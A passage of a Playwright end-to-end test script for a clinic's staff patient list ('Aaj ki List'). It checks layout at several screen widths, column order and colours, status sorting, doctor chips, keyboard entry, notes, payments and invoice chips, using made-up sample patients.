    await p6.getByRole('button', { name: /Front desk \(Gulshan\)/ }).click();
  });
  await p6.goto(BASE + '#/staff/sheet');
  await p6.waitForSelector('table.sheet tbody tr');
  await shot(p6, '10-sheet-mobile');
});
await step('phone width (390px): the Aaj ki List controls do not overlap, the page does not scroll sideways, and the name stays at the left edge', async () => {
  const check = await p6.evaluate(() => {
    const els = [...document.querySelectorAll('.sheet-head :is(h1, button, a, input, select), .sheet-subhead :is(button, .save-status), .add-panel :is(.add-label, button, input, .add-panel-text)')]
      .filter((el) => el.getClientRects().length && !el.closest('[hidden]'));
    const r = els.map((el) => el.getBoundingClientRect());
    const name = (el) => (el.getAttribute('aria-label') || el.textContent).trim().slice(0, 30);
    const overlaps = [];
    for (let i = 0; i < r.length; i++) {
      for (let j = i + 1; j < r.length; j++) {
        if (els[i].contains(els[j]) || els[j].contains(els[i])) continue;
        const [a, b] = [r[i], r[j]];
        if (a.left < b.right - 1 && b.left < a.right - 1 && a.top < b.bottom - 1 && b.top < a.bottom - 1) overlaps.push(`${name(els[i])} / ${name(els[j])}`);
      }
    }
    const offscreen = els.filter((el, i) => r[i].right > window.innerWidth + 1 || r[i].left < -1).map(name);
    const wrap = document.querySelector('.sheet-wrap');
    wrap.scrollLeft = 400;
    const w = wrap.getBoundingClientRect();
    const cell = document.querySelector('table.sheet tbody th.name-col').getBoundingClientRect();
    return { n: els.length, overlaps, offscreen, sideScroll: document.documentElement.scrollWidth > window.innerWidth + 1, scrolled: wrap.scrollLeft, nameLeft: cell.left - w.left };
  });
  assert.ok(check.n >= 8, 'found the controls: ' + check.n);
  assert.deepEqual(check.overlaps, [], 'no two controls overlap');
  assert.deepEqual(check.offscreen, [], 'every control is on the screen');
  assert.ok(!check.sideScroll, 'the page itself does not scroll sideways');
  assert.ok(check.scrolled > 300 && Math.abs(check.nameLeft - 1) <= 2, 'the name column stays at the left edge: ' + JSON.stringify(check));
  await p6.evaluate(() => { document.querySelector('.sheet-wrap').scrollLeft = 0; });
});

// ------------------------------------------------------------- the Aaj ki List like the clinic's Google Sheet, on a busy day
// "?demo=busy" fills today's Gulshan list with 120 made-up patients ("Sample Patient 001" to "120", Mr# 7001 to 7120).
const pb = await newPage({ width: 1366, height: 768 });
const measureSheet = (pg) => pg.evaluate(() => {
  const wrap = document.querySelector('.sheet-wrap');
  const head = wrap.querySelector('thead').getBoundingClientRect();
  const w = wrap.getBoundingClientRect();
  const bottom = Math.min(w.top + wrap.clientTop + wrap.clientHeight, window.innerHeight);
  const inSight = [...wrap.querySelectorAll('tbody tr')].filter((tr) => { const r = tr.getBoundingClientRect(); return r.top >= head.bottom - 0.5 && r.bottom <= bottom + 0.5; }).length;
  const page = document.querySelector('.sheet-page').getBoundingClientRect();
  const add = document.querySelector('.add-panel').getBoundingClientRect();
  return { inSight, chrome: Math.round(w.top - page.top + add.height), pageScrolls: document.documentElement.scrollHeight > window.innerHeight + 1, addBottom: add.bottom };
});
// The note of a busy-day patient as the data has it (it saves by itself, after a short pause): the list shows no note mark.
async function expectNote(pg, name, text) {
  const noteOf = () => pg.evaluate(async (who) => {
    const { state } = await import('/js/state.js');
    const { localISO } = await import('/js/ui/dom.js');
    return (await state.data.listVisits({ branchId: 1, date: localISO() })).find((v) => v.patient.full_name === who)?.notes ?? null;
  }, name);
  for (let i = 0; i < 50 && (await noteOf()) !== text; i += 1) await pg.waitForTimeout(100);
  assert.equal(await noteOf(), text, `${name}: the note is saved`);
}
await step('busy day at 1366x768: at least 20 patients in sight without scrolling the page, the header row stays put while the rows scroll, head and add line under 150px', async () => {
  await loginAs(pb, 'Front desk \\(Gulshan\\)');
  await pb.goto(BASE + '#/staff/sheet?demo=busy');
  await pb.waitForFunction(() => document.querySelectorAll('table.sheet tbody tr').length >= 120);
  const m = await measureSheet(pb);
  assert.ok(m.inSight >= 20, 'patient rows fully in sight: ' + JSON.stringify(m));
  assert.ok(!m.pageScrolls, 'the page itself does not scroll: ' + JSON.stringify(m));
  assert.ok(m.chrome <= 150, 'page head, toolbar and add line: ' + JSON.stringify(m));
  assert.ok(m.addBottom <= 768, 'the add line is in sight at the bottom: ' + JSON.stringify(m));
  const scrolled = await pb.evaluate(() => {
    const wrap = document.querySelector('.sheet-wrap');
    wrap.scrollTop = 900;
    const w = wrap.getBoundingClientRect();
    const th = wrap.querySelector('thead th.mr-cell').getBoundingClientRect();
    const first = [...wrap.querySelectorAll('tbody tr')].find((tr) => tr.getBoundingClientRect().top >= th.bottom - 1);
    return { top: wrap.scrollTop, headTop: th.top - w.top, firstRow: Number(first?.dataset.n) };
  });
  assert.ok(scrolled.top > 800 && Math.abs(scrolled.headTop - 1) <= 2 && scrolled.firstRow > 30, 'the header row stays at the top: ' + JSON.stringify(scrolled));
  await pb.evaluate(() => { document.querySelector('.sheet-wrap').scrollTop = 0; });
  await shot(pb, '20-sheet-busy-1366');
});
await step('busy day at 1920x1080: at least 28 patients in sight; at 1100px wide the Mr# and name columns stay put when the list scrolls sideways', async () => {
  await pb.setViewportSize({ width: 1920, height: 1080 });
  await pb.waitForTimeout(200);
  const m = await measureSheet(pb);
  assert.ok(m.inSight >= 28 && !m.pageScrolls, 'patient rows fully in sight: ' + JSON.stringify(m));
  await shot(pb, '21-sheet-busy-1920');
  await pb.setViewportSize({ width: 1100, height: 768 });
  await pb.waitForTimeout(200);
  const frozen = await pb.evaluate(() => {
    const wrap = document.querySelector('.sheet-wrap');
    wrap.scrollLeft = 300;
    const w = wrap.getBoundingClientRect().left;
    const at = (sel) => Math.round(document.querySelector(sel).getBoundingClientRect().left - w);
    return { scrolled: wrap.scrollLeft, num: at('table.sheet tbody td.rownum'), mr: at('table.sheet tbody td.mr-cell'), name: at('table.sheet tbody th.name-col'), headName: at('table.sheet thead th.name-col') };
  });
  assert.ok(frozen.scrolled > 100, 'the list scrolled sideways: ' + JSON.stringify(frozen));
  assert.ok(Math.abs(frozen.num - 1) <= 2 && Math.abs(frozen.mr - 35) <= 2 && Math.abs(frozen.name - 97) <= 2 && frozen.headName === frozen.name, 'row number, Mr# and name stay at the left: ' + JSON.stringify(frozen));
  await pb.evaluate(() => { document.querySelector('.sheet-wrap').scrollLeft = 0; });
  await pb.setViewportSize({ width: 1366, height: 768 });
});
await step('the columns are the sheet\'s, in the sheet\'s order (the serial number first, Reminder Status last, Group a drop-down), with the purple header row and the red P.P heading', async () => {
  // Owner, 11 Oct 2026: "the columns of google sheet should be same here too, for example, the group column with drop
  // down". The sheet: MR #, Patient Name, Months, Treatment, Token, Waiting (the status), Group, Doctor Name, Treatment
  // Details, P.P, Healthwire (Invoice: billing is on the website now), Contact No, Reminder Status.
  const heads = (await pb.locator('table.sheet thead th:visible').allInnerTexts()).map((t) => t.replace('▾', '').trim());
  assert.deepEqual(heads, ['#', 'MR #', 'Patient Name', 'Month', 'Treatment', 'Token', 'Status', 'Group', 'Doctor Name', 'Treatment Details', 'P.P', 'Invoice', 'Contact No', 'Reminder Status']);
  const cells = await pb.locator('table.sheet tbody tr[data-id]').evaluateAll((trs) => ({ rows: trs.length, odd: trs.filter((tr) => tr.children.length !== document.querySelectorAll('table.sheet col').length).length,
    groups: trs.filter((tr) => !tr.classList.contains('is-checkup')).map((tr) => tr.children[7].querySelector('select[aria-label^="Doctor group for"]')?.options.length || 0) }));
  assert.ok(cells.rows >= 120 && cells.odd === 0, 'one cell per heading in every row: ' + JSON.stringify({ rows: cells.rows, odd: cells.odd }));
  assert.ok(cells.groups.every((n) => n >= 4), 'the Group cell of every patient row is a drop-down (No group, Group 1 to 3 at least)');
  // On a 1366px laptop Treatment Details keeps about the width of the sheet's column and the list scrolls sideways for the
  // last columns (Contact No, Reminder Status), as the sheet's last columns are out of sight in a laptop's window.
  const room = await pb.evaluate(() => {
    const th = (t) => [...document.querySelectorAll('table.sheet thead th')].find((x) => x.textContent.replace('▾', '').trim() === t);
    const wrap = document.querySelector('.sheet-wrap');
    return { details: Math.round(th('Treatment Details').getBoundingClientRect().width), reminderCut: th('Reminder Status').scrollWidth > th('Reminder Status').clientWidth,
      sideScroll: wrap.scrollWidth > wrap.clientWidth };
  });
  assert.ok(room.details >= 250 && !room.reminderCut && room.sideScroll, 'Treatment Details keeps its room: ' + JSON.stringify(room));
  const c = await pb.evaluate(() => {
    const s = (sel) => getComputedStyle(document.querySelector(sel));
    return { head: s('table.sheet thead th.mr-cell').backgroundColor, headText: s('table.sheet thead th.mr-cell').color, pp: s('table.sheet thead th.pp-head').backgroundColor,
      ppText: s('table.sheet thead th.pp-head').color, dues: s('table.sheet tbody .pp-due').color, duesWeight: s('table.sheet tbody .pp-due').fontWeight };
  });
  assert.equal(c.head, 'rgb(90, 50, 134)', 'purple header row');
  assert.equal(c.headText, 'rgb(255, 255, 255)');
  const [r, g, b] = c.pp.match(/\d+/g).map(Number);
  assert.ok(r >= 200 && g <= 30 && b <= 30 && c.ppText === 'rgb(255, 255, 255)', 'red P.P heading with white text: ' + JSON.stringify(c));
  assert.ok(/^rgb\(2\d\d, 0, 0\)$/.test(c.dues) && Number(c.duesWeight) >= 700, 'dues in red bold: ' + JSON.stringify(c));
  const pp = await pb.locator('table.sheet tbody tr', { hasText: 'Sample Patient 007' }).locator('td.pp').innerText();
  assert.match(pp, /^11\.5k/, 'P.P written like the sheet');
  assert.deepEqual(await pb.evaluate(async () => { const m = await import('/js/views/staff/sheet.js'); return [0, 500, 11500, 20000, 125000].map(m.shortRupees); }), ['0', '500', '11.5k', '20k', '125k']);
});
await step('status, group, month and doctor chips carry the sheet\'s colours; Invoice shows Done or Pending', async () => {
  const chips = await pb.evaluate(() => {
    const rows = [...document.querySelectorAll('table.sheet tbody tr:not(.is-checkup)')];
    return {
      status: rows.map((tr) => { const s = tr.querySelector('select[aria-label^="Status for"]'); return [s.value, s.className, getComputedStyle(s).backgroundColor]; }),
      group: rows.map((tr) => { const s = tr.querySelector('select[aria-label^="Doctor group for"]'); return [s.value, s.className]; }),
      month: rows.map((tr) => tr.querySelector('.month-pill')).filter(Boolean).map((el) => [el.textContent, el.className]),
      people: [...document.querySelectorAll('table.sheet tbody .people .person')].map((el) => [el.getAttribute('title').replace(/ \((checked|assistant)\)$/, ''), (el.className.match(/\bgs-\w+/) || [''])[0]]),
    };
  });
  const statusTone = { completed: 'gs-yellow', in_treatment: 'gs-green', scheduled: 'gs-blue', waiting: 'gs-orange', cancelled: 'gs-grey', no_show: 'gs-red' };
  assert.ok(new Set(chips.status.map(([v]) => v)).size >= 4, 'the busy day has every state of a day half done');
  for (const [v, cls] of chips.status) assert.ok(cls.split(' ').includes(statusTone[v]), `status ${v}: ${cls}`);
  assert.ok(chips.status.some(([v, , bg]) => v === 'completed' && bg === 'rgb(255, 229, 160)'), 'Completed is the sheet\'s light yellow');
  assert.ok(chips.status.some(([v, , bg]) => v === 'waiting' && bg === 'rgb(255, 200, 170)'), 'Waiting is light orange');
  const groupTone = { '': 'gs-grey', 1: 'gs-blue', 2: 'gs-green', 3: 'gs-purple' };
  assert.ok(new Set(chips.group.map(([v]) => v)).size >= 4, 'groups 1 to 3 and no group');
  for (const [v, cls] of chips.group) assert.ok(cls.split(' ').includes(groupTone[v]), `group ${v}: ${cls}`);
  assert.ok(chips.month.some(([t]) => /Photo/.test(t)) && chips.month.some(([t]) => !/Photo/.test(t)), 'photo months and other months');
  for (const [text, cls] of chips.month) assert.ok(cls.split(' ').includes(/Photo/.test(text) ? 'gs-green' : 'gs-purple'), `month ${text}: ${cls}`);
  assert.ok(chips.people.length >= 60, 'doctor chips: ' + chips.people.length);
  const tone = new Map();
  for (const [name, cls] of chips.people) {
    assert.ok(cls, `${name} has a colour`);
    if (tone.has(name)) assert.equal(cls, tone.get(name), `${name} keeps one colour on every row`);
    tone.set(name, cls);
  }
  // Two people in one cell never share a colour on the busy day (the sample clinicians have fixed ids, so their colours are
  // also the same on every load).
  const clash = await pb.evaluate(() => [...document.querySelectorAll('table.sheet tbody .people')].flatMap((cell) => {
    const ps = [...cell.querySelectorAll('.person')].map((el) => [el.getAttribute('title').replace(/ \((checked|assistant)\)$/, ''), (el.className.match(/\bgs-\w+/) || [''])[0]]);
    return ps.flatMap(([n, c], i) => ps.slice(i + 1).filter(([m, d]) => m !== n && d === c).map(([m]) => `${n} / ${m}`));
  }));
  assert.deepEqual(clash, [], 'people in one cell with the same colour');
  // Every sample clinician has a colour of their own (eleven people, fourteen colours; lib/tones.js), and someone who is not
  // on the clinic's list (no longer active) still gets one colour every time.
  const own = await pb.evaluate(async () => {
    const m = await import('/js/views/staff/sheet.js');
    const { state } = await import('/js/state.js');
    return { all: state.ref.clinicians.map((c) => m.doctorTone(c.id, c.display_name)), gone: ['a1', 'b2'].map((id) => [m.doctorTone(id, 'Dr. Made Up'), m.doctorTone(id, 'Dr. Made Up')]) };
  });
  assert.ok(own.all.length === 11 && new Set(own.all).size === 11, 'every sample clinician differs: ' + JSON.stringify(own.all));
  assert.ok(own.gone.every(([a, b]) => a && a === b && a !== 'grey'), JSON.stringify(own.gone));
  assert.ok(await pb.locator('table.sheet tbody td span.chip.gs-green:text-is("Done")').count(), 'Done');
  assert.ok(await pb.locator('table.sheet tbody td button.invoice-pending.gs-darkred:text-is("Pending")').count(), 'Pending (treated, no invoice yet)');
  const unbilled = await pb.evaluate(() => [...document.querySelectorAll('table.sheet tbody tr:not(.is-checkup)')]
    .map((tr) => [tr.querySelector('select[aria-label^="Status for"]').value, tr.querySelector('.invoice-pending, .invoice-none')]).filter(([, b]) => b)
    .map(([status, b]) => ({ status, pending: b.classList.contains('invoice-pending'), grey: b.classList.contains('gs-grey'), label: b.getAttribute('aria-label'),
      shown: [...b.childNodes].filter((n) => !(n.nodeType === 1 && n.classList.contains('sr-only'))).map((n) => n.textContent).join('').trim() })));
  const notSeen = unbilled.filter((x) => ['waiting', 'scheduled'].includes(x.status));
  assert.ok(notSeen.length > 10 && notSeen.every((x) => !x.pending && x.grey && x.shown === '' && /^No invoice yet for .+: make a new invoice$/.test(x.label)),
    'not seen yet: an empty grey chip, "No invoice yet" for screen readers: ' + JSON.stringify(notSeen.find((x) => x.pending || x.shown)));
  const seen = unbilled.filter((x) => ['in_treatment', 'completed'].includes(x.status));
  assert.ok(seen.length && seen.every((x) => x.pending && x.shown === 'Pending' && /^Invoice pending for /.test(x.label)), 'seen and no invoice: Pending');
  await shot(pb, '22-sheet-chips');
});
await step('round 3: sorted like the sheet (Waiting, In treatment, Scheduled, then Completed, then Cancelled and No show) with one running serial number 1..n at the far left; the Completed count says how many are done', async () => {
  // Owner, 11 Oct 2026: "waiting patient comes at the top, then treatment, then scheduled, then completed ones at the last"
  // and "i want a serial number by the left side, so we can see how many patients we have actually done".
  const rows = await pb.locator('table.sheet tbody tr[data-id]').evaluateAll((trs) => trs.map((t) => ({
    status: t.querySelector('select[aria-label^="Status for"]').value, serial: t.querySelector('td.rownum').textContent, first: t.children[0].matches('td.rownum') })));
  const rank = { waiting: 0, in_treatment: 1, scheduled: 2, '': 3, completed: 4, cancelled: 5, no_show: 6 };
  assert.ok(rows.length >= 120, 'the busy list: ' + rows.length);
  assert.ok(rows.every((r, i) => i === 0 || rank[rows[i - 1].status] <= rank[r.status]), 'sorted by status: ' + [...new Set(rows.map((r) => r.status))].join(', '));
  const done = rows.map((r) => r.status === 'completed');
  const toSee = rows.map((r) => ['waiting', 'in_treatment', 'scheduled', ''].includes(r.status)).lastIndexOf(true);
  assert.ok(done.indexOf(true) > toSee && done.lastIndexOf(true) - done.indexOf(true) + 1 === done.filter(Boolean).length,
    'the Completed rows come together, after every patient still to be seen');
  assert.deepEqual(rows.map((r) => r.serial), rows.map((_, i) => String(i + 1)), 'one running serial number 1..n down the list (not the token)');
  assert.ok(rows.every((r) => r.first), 'the serial number is the far left column');
  const completed = await pb.locator('.sheet-counts button', { hasText: 'Completed' }).innerText();
  assert.equal(Number(completed.replace(/\D/g, '')), done.filter(Boolean).length, 'the Completed count: ' + completed);
});
await step('round 3: two doctors in one cell have clearly different colours, and so do the doctors down the list', async () => {
  // Owner, 11 Oct 2026: "doctor names should have similar colours so they dont look all the same", like the sheet.
  const r93 = pb.locator('table.sheet tbody tr', { hasText: 'Sample Patient 093' });
  assert.equal(await r93.locator('.person').count(), 0);
  await r93.locator('.add-person').click();
  for (const name of ['Dr. Amna (sample)', 'Dr. Bushra (sample)']) {
    await pb.click(`.modal button:has-text("${name}")`);
    await pb.waitForSelector(`.toast:has-text("${name} added to Sample Patient 093")`);
  }
  await pb.locator('.modal').getByRole('button', { name: 'Done' }).click();
  await pb.waitForSelector('.modal', { state: 'detached' });
  await r93.locator('.person').nth(1).waitFor();
  const two = await r93.locator('.person').evaluateAll((els) => els.map((el) => ({ tone: (el.className.match(/\bgs-\w+/) || [''])[0], bg: getComputedStyle(el).backgroundColor })));
  assert.ok(two.length === 2 && two[0].tone && two[0].tone !== two[1].tone && two[0].bg !== two[1].bg, 'two doctors in one cell: ' + JSON.stringify(two));
  // down the list: one colour per person, and different people never share one on the busy day
  const byName = await pb.evaluate(() => {
    const m = {};
    for (const el of document.querySelectorAll('table.sheet tbody .people .person')) m[el.getAttribute('title').replace(/ \((checked|assistant)\)$/, '')] = (el.className.match(/\bgs-\w+/) || [''])[0];
    return m;
  });
  const tones = Object.values(byName);
  assert.ok(tones.length >= 8 && tones.every(Boolean) && new Set(tones).size === tones.length, 'one colour per person down the list: ' + JSON.stringify(byName));
  await pb.evaluate(() => document.activeElement?.blur());
});
await step('busy day: an exact Mr# and Enter adds that patient at once (no extra click) and puts the cursor in the Treatment cell; Enter there saves and goes to the add box for the next Mr# (never into the row below)', async () => {
  const before = await pb.locator('table.sheet tbody tr').count();
  const box = pb.locator('.add-panel input[type=search]');
  // (the checkup rows as the data has them: their cells save as they are typed, so the next Mr# must not land in one)
  const checkupsNow = () => pb.evaluate(async () => {
    const { state } = await import('/js/state.js');
    const { localISO } = await import('/js/ui/dom.js');
    return (await state.data.listDayCheckups({ branchId: 1, date: localISO() })).map((c) => [c.patient_name, c.checkup_for, c.token, c.phone]);
  });
  const checkupsBefore = await checkupsNow();
  assert.ok(checkupsBefore.length, 'the busy day has a checkup row');
  await box.fill('9816');
  await box.press('Enter');
  const row = pb.locator('table.sheet tbody tr:not(.is-checkup)', { hasText: 'Mr# 9816' });
  await row.waitFor();
  await pb.waitForFunction(() => document.activeElement?.matches('input[aria-label^="Treatment for"]') && document.activeElement.closest('tr')?.textContent.includes('Mr# 9816'));
  assert.equal(await pb.locator('.modal').count(), 0, 'no dialog in the way');
  assert.equal(await box.inputValue(), '', 'the add box is empty for the next one');
  assert.equal(await pb.locator('table.sheet tbody tr').count(), before + 1);
  // (sorted like the sheet: the new patient is Waiting with the next token, so the last waiting patient, and the waiting
  //  checkup patient of the day comes next)
  assert.deepEqual(await row.evaluate((tr) => [tr.querySelector('select[aria-label^="Status for"]').value, tr.nextElementSibling?.dataset.kind]), ['waiting', 'checkup'], 'the new patient is the last waiting patient, above the waiting checkup row');
  await pb.keyboard.type('Monthly PC');
  await pb.keyboard.press('Enter');
  assert.ok(await box.evaluate((el) => el === document.activeElement), 'Enter in the patient just added goes to the add box, the sheet\'s next empty row');
  // the rhythm goes on: the next Mr# and Enter adds the next patient
  await pb.keyboard.type('9821');
  await pb.keyboard.press('Enter');
  const row2 = pb.locator('table.sheet tbody tr:not(.is-checkup)', { hasText: 'Mr# 9821' });
  await row2.waitFor();
  await pb.waitForFunction(() => document.activeElement?.matches('input[aria-label^="Treatment for"]') && document.activeElement.closest('tr')?.textContent.includes('Mr# 9821'));
  await pb.waitForSelector('.save-state[data-state="saved"]', { timeout: 5000 });
  assert.equal(await row.locator('input[aria-label^="Treatment for"]').inputValue(), 'Monthly PC');
  assert.deepEqual(await checkupsNow(), checkupsBefore, 'the checkup rows are unchanged');
  // Arrow Down still goes into the checkup row and ArrowUp comes back to the same column; Enter in a row the add line did not
  // just put the cursor in moves down
  const label = () => pb.evaluate(() => document.activeElement?.getAttribute('aria-label'));
  await pb.keyboard.press('ArrowDown');
  assert.ok(await pb.evaluate(() => document.activeElement?.closest('tr')?.dataset.kind === 'checkup' && document.activeElement.matches('input[aria-label^="Treatment for"]')), 'Arrow Down into the checkup row: ' + await label());
  await pb.keyboard.press('ArrowUp');
  await pb.keyboard.press('ArrowUp');
  assert.equal(await label(), await row.locator('input[aria-label^="Treatment for"]').getAttribute('aria-label'), 'ArrowUp comes back to the same column');
  await pb.keyboard.press('Enter');
  assert.equal(await label(), await row2.locator('input[aria-label^="Treatment for"]').getAttribute('aria-label'), 'Enter moved down to the patient below');
  await pb.evaluate(() => document.activeElement?.blur());
  // a name (not an exact Mr#) still shows the matches to choose from
  await box.fill('Sample Patient 11');
  await box.press('Enter');
  await pb.locator('.add-panel .suggestions button', { hasText: 'Sample Patient 110' }).waitFor();
  await box.fill('');
  await pb.keyboard.press('Escape');
});
await step('busy day: every action of the old list is still reachable (row actions, notes, + add doctor with undo, quick-tap, group, dues check, quick filters, checkup Options, New invoice from Pending)', async () => {
  // row actions behind a click on the name: guidance, upload photos, new invoice, take payment, Dr. Ali, profile, notes
  const r10 = pb.locator('table.sheet tbody tr', { hasText: 'Sample Patient 010' });
  await r10.locator('.name-btn').click();
  const m = pb.locator('.modal');
  await m.locator('h2:has-text("Sample Patient 010 · Mr# 7010")').waitFor();
  // (the front desk does not upload clinic photos: Dr. Ali's dialog below has that button)
  for (const name of ['New invoice', 'Take payment', 'Next appointment with Dr. Ali', 'Open profile']) assert.ok(await m.getByRole('button', { name }).count(), name);
  assert.ok(await m.locator('.stat').count(), 'braces guidance');
  await m.getByLabel('Notes').fill('Bring the retainer case');
  await pb.keyboard.press('Escape');
  // (saved by itself; the list shows no note mark, the patient's profile shows the note)
  await expectNote(pb, 'Sample Patient 010', 'Bring the retainer case');
  // + add a doctor (the braces rule applies), remove with undo
  const r82 = pb.locator('table.sheet tbody tr', { hasText: 'Sample Patient 082' });
  assert.equal(await r82.locator('.person').count(), 0);
  await r82.locator('.add-person').click();
  await pb.click('.modal button:has-text("Dr. Nida (sample)")');
  await pb.waitForSelector('.toast:has-text("Dr. Nida (sample) added to Sample Patient 082")');
  await pb.locator('.modal').getByRole('button', { name: 'Done' }).click();
  await r82.locator('.person:has-text("Dr. Nida (sample)")').waitFor();
  // one click on the chip's × removes, as before (on a laptop the × shows on the chip under the mouse), and Undo brings them back
  await r82.locator('.person:has-text("Dr. Nida (sample)")').hover();
  await r82.getByRole('button', { name: 'Remove Dr. Nida (sample) from Sample Patient 082' }).click();
  await r82.locator('.person').waitFor({ state: 'detached' });
  await pb.getByRole('button', { name: 'Undo' }).click();
  await r82.locator('.person:has-text("Dr. Nida (sample)")').waitFor();
  // and from the "+" dialog; its Undo stays on the bar above the list once the dialog is closed
  await r82.locator('.add-person').click();
  await pb.locator('.modal').getByRole('button', { name: 'Remove Dr. Nida (sample) from Sample Patient 082' }).click();
  await r82.locator('.person').waitFor({ state: 'detached' });
  await pb.locator('.modal').getByRole('button', { name: 'Done' }).click();
  await pb.waitForSelector('.modal', { state: 'detached' });
  await pb.getByRole('button', { name: 'Undo' }).click();
  await r82.locator('.person:has-text("Dr. Nida (sample)")').waitFor();
  // quick-tap treatment details
  await r82.locator('.quick-tap').click();
  await pb.locator('.modal button:has-text("016")').click();
  await pb.locator('.modal button:has-text("PC")').first().click();
  await pb.locator('.modal').getByRole('button', { name: 'Done' }).click();
  assert.match(await r82.locator('input[aria-label^="Treatment details"]').inputValue(), /016 PC$/);
  // the group chip saves at once and takes its colour
  await r82.locator('select[aria-label^="Doctor group for"]').selectOption('2');
  await pb.waitForFunction(() => [...document.querySelectorAll('table.sheet tbody tr')].find((t) => t.textContent.includes('Sample Patient 082'))?.querySelector('select[aria-label^="Doctor group for"]').classList.contains('gs-green'));
  // status change with the dues check (warn mode: the front desk is told to clear dues first)
  await pb.locator('table.sheet tbody tr', { hasText: 'Sample Patient 084' }).locator('select[aria-label^="Status for"]').selectOption('in_treatment');
  await pb.waitForSelector('.toast:has-text("Clear dues first")');
  // the status counts are quick filters
  await pb.locator('.sheet-counts button', { hasText: 'Waiting' }).click();
  const shown = await pb.locator('table.sheet tbody select[aria-label^="Status for"]').evaluateAll((els) => els.map((e) => e.value));
  assert.ok(shown.length > 5 && shown.every((v) => v === 'waiting'), 'only waiting rows');
  assert.equal(await pb.locator('.sheet-counts button', { hasText: 'Waiting' }).getAttribute('aria-pressed'), 'true');
  await pb.locator('.sheet-counts button', { hasText: 'Waiting' }).click();
  assert.ok((await pb.locator('table.sheet tbody tr').count()) > 120, 'a second click shows everyone again');
  // the ▾ of a heading opens the filter for that column
  await pb.getByRole('button', { name: 'Filter by doctor', exact: true }).click();
  assert.equal(await pb.evaluate(() => document.activeElement?.getAttribute('aria-label')), 'Filter by doctor');
  await pb.keyboard.press('Escape');
  assert.ok(await pb.locator('#sheet-filter-panel').isHidden(), 'Escape closes the filters');
  // a checkup row: its own cells, status and Options (follow-up, notes, register, remove)
  const ck = pb.locator('table.sheet tbody tr.is-checkup', { has: pb.locator('input[aria-label="Name of checkup patient Imtiaz Gill"]') });
  await ck.getByRole('button', { name: 'Checkup options for Imtiaz Gill' }).click();
  for (const name of ['Register as patient', 'Open in the checkup list']) assert.ok(await pb.locator('.modal').getByRole('button', { name }).or(pb.locator('.modal').getByRole('link', { name })).count(), name);
  await pb.locator('.modal').getByLabel('Notes').fill('Will call back');
  await pb.locator('.modal').getByRole('button', { name: 'Done' }).click();
  await pb.waitForSelector('.save-state[data-state="saved"]', { timeout: 5000 });
  // New invoice from a Pending chip
  await pb.locator('table.sheet tbody button.invoice-pending.gs-darkred').first().click();
  await pb.locator('.modal h2:has-text("New invoice ·")').waitFor();
  await pb.locator('.modal').getByRole('button', { name: 'Cancel' }).click();
  await pb.waitForSelector('.modal', { state: 'detached' });
  assert.ok(await pb.getByRole('link', { name: 'Queue board' }).count(), 'Queue board');
});
await step('busy day: a note typed in the row\'s dialog, then a payment taken there: closing the dialog keeps the new P.P (the row is drawn from the list as it is now, with the note)', async () => {
  const r7 = pb.locator('table.sheet tbody tr', { hasText: 'Sample Patient 007' });
  const pp = () => r7.locator('td.pp').innerText();
  assert.match(await pp(), /^11\.5k/);
  await r7.locator('.name-btn').click();
  await pb.locator('.modal').getByLabel('Notes').fill('Pays at the desk');
  await pb.locator('.modal').getByRole('button', { name: 'Take payment' }).click();
  await pb.locator('.modal:has(h2:has-text("Take payment · Sample Patient 007"))').getByRole('button', { name: 'Save payment' }).click();
  await pb.waitForSelector('.toast:has-text("Payment of Rs 11,500 saved")');
  // (the payment reloads the list: the new row shows P.P 0 while the row's dialog is still open)
  await pb.waitForFunction(() => /^0/.test([...document.querySelectorAll('table.sheet tbody tr')].find((t) => t.textContent.includes('Sample Patient 007'))?.querySelector('td.pp').innerText));
  await pb.keyboard.press('Escape');
  await pb.waitForSelector('.modal', { state: 'detached' });
  assert.match(await pp(), /^0/, 'P.P is still 0 after the dialog is closed');
  await expectNote(pb, 'Sample Patient 007', 'Pays at the desk');
  await pb.waitForSelector('.save-state[data-state="saved"]', { timeout: 5000 });
});
await step('busy day at 1366x768: every treatment of the list is whole in the Treatment column, and the cells themselves do not clip (that made typing slow on a long list)', async () => {
  const r = await pb.evaluate(async () => {
    const { state } = await import('/js/state.js');
    document.activeElement?.blur();
    const input = document.querySelector('table.sheet tbody tr:not(.is-checkup) input[aria-label^="Treatment for"]');
    const before = input.value;
    const names = [...state.ref.treatments.map((t) => t.name), 'Monthly / Followup'];
    const cut = names.filter((n) => { input.value = n; return input.scrollWidth > input.clientWidth; });
    input.value = before; // (set without an input event: nothing is saved)
    const clips = [...document.querySelector('table.sheet tbody tr').children].filter((td) => getComputedStyle(td).overflowX !== 'visible').map((td) => td.className);
    return { n: names.length, cut, clips };
  });
  assert.ok(r.n >= 20 && r.cut.length === 0, 'cut short: ' + JSON.stringify(r));
  assert.deepEqual(r.clips, [], 'cells that clip');
});
// Every chip's × that can be reached is in its chip and takes the click or tap (a × cut off by the cell would send it to
// the next cell). On a touch screen each × is in sight. On a laptop a × shows only over the chip under the mouse (or with
// the keyboard on it); the first chip of a row shows its name whole, a later one at least a few letters, or it is out of
// sight whole, counted in the "+" ("+2", its tooltip naming who) and its × out of the Tab order. A name cut short is whole
// in the chip's tooltip, and "Dr." (left off the chip) is still read out.
const checkChips = () => {
  const laptop = matchMedia('(min-width: 900px) and (hover: hover) and (pointer: fine)').matches;
  const blocked = [];
  const unreadable = [];
  const firstCut = [];
  const miscounted = [];
  const hiddenReachable = [];
  const shownUnhovered = [];
  let hiddenChips = 0;
  const all = [...document.querySelectorAll('table.sheet tbody .chip-remove')].filter((x) => x.getClientRects().length);
  const xs = all.filter((x) => x.tabIndex >= 0);
  for (const x of xs) {
    if (laptop && getComputedStyle(x).opacity !== '0') shownUnhovered.push(x.getAttribute('aria-label'));
    x.scrollIntoView({ block: 'center', inline: 'center' });
    const r = x.getBoundingClientRect();
    const hit = document.elementFromPoint(r.left + r.width / 2, r.top + r.height / 2);
    if (!hit || !x.contains(hit)) blocked.push(`${x.getAttribute('aria-label')}: ${hit?.className || hit?.tagName}`);
  }
  for (const cell of document.querySelectorAll('table.sheet tbody .people')) {
    const chips = [...cell.querySelectorAll('.person')];
    if (!chips.length) continue;
    const box = cell.querySelector('.people-chips').getBoundingClientRect();
    const hidden = chips.filter((c) => c.getBoundingClientRect().top >= box.bottom - 1);
    hiddenChips += hidden.length;
    for (const c of hidden) if (c.querySelector('.chip-remove')?.tabIndex >= 0) hiddenReachable.push(c.title);
    const count = cell.querySelector('.people-count');
    const tip = (count.closest('button') || count).title;
